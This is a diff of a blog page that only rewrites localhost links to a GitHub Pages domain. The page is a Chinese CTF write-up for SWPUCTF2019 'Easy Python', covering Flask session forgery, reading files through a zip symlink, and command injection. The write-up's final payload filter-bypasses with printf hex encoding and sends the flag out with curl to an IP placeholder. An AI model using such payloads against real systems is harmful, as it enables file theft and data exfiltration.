@@ -11,22 +11,22 @@
   <meta name="author" content="kveln">
   <title>[SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass) |  </title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
-  <!-- <link href="http://localhost:4000/media/css/bootstrap.min.css" rel="stylesheet"> -->
-  <!--  <link href="http://localhost:4000/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
+  <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
+  <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="[SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass) |   » Feed" href="http://localhost:4000/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass) |   » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
-  <link href="http://localhost:4000/styles/main.css" rel="stylesheet">
+  <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
   <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/highlight.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/jquery.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/jquery.min.js"></script> -->
   <script>hljs.initHighlightingOnLoad();</script>
   
 
     <meta property="og:description" content="[SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass)"/>
-    <meta property="og:url" content="http://localhost:4000/post/swpuctf2019easy-pythonflask-session-wei-zao-ruan-lian-jie-ming-ling-zhi-xing-bypass/"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/swpuctf2019easy-pythonflask-session-wei-zao-ruan-lian-jie-ming-ling-zhi-xing-bypass/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content=" "/>
@@ -35,7 +35,7 @@
   	<!-- Navigation -->
   <nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
     <div class="container">
-      <a class="navbar-brand" href="http://localhost:4000"> </a>
+      <a class="navbar-brand" href="https://guokeya.github.io"> </a>
       <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
         Menu
         <i class="fas fa-bars"></i>
@@ -72,7 +72,7 @@
     </div>
   </nav>
   <!-- Page Header -->
-  <header class="masthead" style="background-image: url('http://localhost:4000/media/images/home-bg.jpg')">
+  <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
@@ -80,9 +80,9 @@
           <div class="post-heading">
           	<span class="tags">
           	 
-            <a href="http://localhost:4000/tag/CTF/" class="tag">CTF</a>
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
             
-            <a href="http://localhost:4000/tag/Web/" class="tag">Web安全</a>
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
             
         </span>
             <h1>[SWPUCTF2019]Easy Python(flask session伪造+软链接+命令执行bypass)</h1>
@@ -104,16 +104,16 @@
           <p>浏览器标签中提示了。CTF-Flask-demo<br>
 说明这是个Flask框架。随便输入登陆。用户名会显示在主页上</p>
 <!-- more -->
-<p><img src="http://localhost:4000/post-images/1579667560563.png" alt="" loading="lazy"><br>
+<p><img src="https://guokeya.github.io/post-images/1579667560563.png" alt="" loading="lazy"><br>
 进入upload页面。提示没权限。<br>
-<img src="http://localhost:4000/post-images/1579667529181.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579667529181.png" alt="" loading="lazy"><br>
 明显的session伪造。<br>
 那么。我们就需要去找密钥。<br>
 在404返回中。我们找到了密钥<br>
-<img src="http://localhost:4000/post-images/1579667651017.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579667651017.png" alt="" loading="lazy"><br>
 开始伪造。一开始用python2伪造。发现不行。用python3就可以了<br>
 伪造后刷新。用户名已经变成了admin<br>
-<img src="http://localhost:4000/post-images/1579667815113.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579667815113.png" alt="" loading="lazy"><br>
 尝试文件上传jpg。返回<code>zip only allowed</code><br>
 zip。。之前做过类似的题目。zip软连接。<br>
 链接个<code>/etc/passwd</code>试试手</p>
@@ -121,9 +121,9 @@ zip。。之前做过类似的题目。zip软连接。<br>
 zip -ry test.zip link
 </code></pre>
 <p>成功返回/etc/passwd<br>
-<img src="http://localhost:4000/post-images/1579667945267.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579667945267.png" alt="" loading="lazy"><br>
 直接读/flag。直接还是passwd的内容？？？？<br>
-<img src="http://localhost:4000/post-images/1579668292047.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579668292047.png" alt="" loading="lazy"><br>
 接下来就要找flag路径了<br>
 右键源代码。看到了源码</p>
 <pre><code>@app.route('/upload',methods=['GET','POST'])
@@ -210,43 +210,43 @@ def showflag():
 在Linux中/proc/self/cmd会指向当前目录<br>
 /proc/self/cmd/flag/flag.jpg=./flag/flag.jpg<br>
 所以。我们构造一个软链接就可以读取flag<br>
-<img src="http://localhost:4000/post-images/1579668573879.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579668573879.png" alt="" loading="lazy"><br>
 2：<br>
 在Linux中/proc/self/environ包含了进程所有的环境变量。可以在里面获取flask的绝对路径。然后软链接<br>
-<img src="http://localhost:4000/post-images/1579668801756.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1579669009321.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579668801756.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669009321.png" alt="" loading="lazy"><br>
 通过命令执行取读取flag<br>
-<img src="http://localhost:4000/post-images/1579669027878.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669027878.png" alt="" loading="lazy"><br>
 这里进行了命令拼接。但是不能出现分号斜杠点竖杠flag字符<br>
 由于buuctf的靶机访问不了外网。我们就试一下payload<br>
 我们可以通过$()这种格式。执行命令。<br>
-<img src="http://localhost:4000/post-images/1579669219143.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669219143.png" alt="" loading="lazy"><br>
 成功执行了ls。并且在zip中以参数运行。ls是最先执行的<br>
 也就是说。ls-&gt;zip<br>
-<img src="http://localhost:4000/post-images/1579669243869.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669243869.png" alt="" loading="lazy"><br>
 虽然在web中会没回显。但是我们可以通过外带数据。拿到flag<br>
 curl是可以访问的<br>
-<img src="http://localhost:4000/post-images/1579669353809.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669353809.png" alt="" loading="lazy"><br>
 如图。用反引号最先执行。获得flag内容。然后再括号内运行。将flag内容作为参数。用curl请求<br>
-<img src="http://localhost:4000/post-images/1579669464604.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669464604.png" alt="" loading="lazy"><br>
 但是。题目过滤了flag。和/这类的字符。<br>
 还记得PHP下的chr(xx)绕过字符吗。<br>
 Linux也可以<br>
-<img src="http://localhost:4000/post-images/1579669592141.png" alt="" loading="lazy"></p>
+<img src="https://guokeya.github.io/post-images/1579669592141.png" alt="" loading="lazy"></p>
 <p>我们需要绕过/flag/flag.jpg<br>
 而/和flag都被过滤<br>
 那么我们可以构造<br>
 a=/flag<br>
 然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>a.jpg<br>
-<img src="http://localhost:4000/post-images/1579669662744.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579669662744.png" alt="" loading="lazy"><br>
 思路明确了。下面开始写exp<br>
 <code>$(a=`printf '\x2f\x66\x6c\x61\x67'`&amp;&amp;curl 192.168.0.149:8080/`cat .$a$a.jpg`).zip</code><br>
-<img src="http://localhost:4000/post-images/1579670517932.png" alt="" loading="lazy"><br>
+<img src="https://guokeya.github.io/post-images/1579670517932.png" alt="" loading="lazy"><br>
 做题时。把IP换成VPS地址就好了</p>
 
           
           <p class="next-post">下一篇：
-            <a href="http://localhost:4000/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">
+            <a href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">
               <span class="post-title">
                 [SWPUCTF 2018]SimplePHP（POP链phar反序列化）&rarr;
               </span>
@@ -290,7 +290,7 @@ a=/flag<br>
             
               
               <li class="list-inline-item">
-              <a href="http://localhost:4000/atom.xml" target="_blank">
+              <a href="https://guokeya.github.io/atom.xml" target="_blank">
                 <span class="fa-stack fa-lg">
                   <i class="fas fa-circle fa-stack-2x"></i>
                   <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
@@ -305,10 +305,10 @@ a=/flag<br>
    </footer>
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/bootstrap.bundle.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/bootstrap.bundle.min.js"></script> -->
   <!-- Bootstrap core JavaScript -->
   <script src="https://cdn.jsdelivr.net/gh/Alanrk/clean-cdn@1.0/scripts/clean-blog.min.js"></script>
-  <!-- <script src="http://localhost:4000/media/scripts/clean-blog.min.js"></script> -->
+  <!-- <script src="https://guokeya.github.io/media/scripts/clean-blog.min.js"></script> -->
   <script src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
   <style type="text/css">a.back_to_top{text-decoration:none;position:fixed;bottom:40px;right:30px;background:#f0f0f0;height:40px;width:40px;border-radius:50%;line-height:36px;font-size:18px;text-align:center;transition-duration:.5s;transition-propety:background-color;display:none}a.back_to_top span{color:#888}a.back_to_top:hover{cursor:pointer;background:#dfdfdf}a.back_to_top:hover span{color:#555}@media print,screen and(max-width:580px){.back_to_top{display:none!important}}</style>
 <a id="back_to_top" href="#" class="back_to_top">
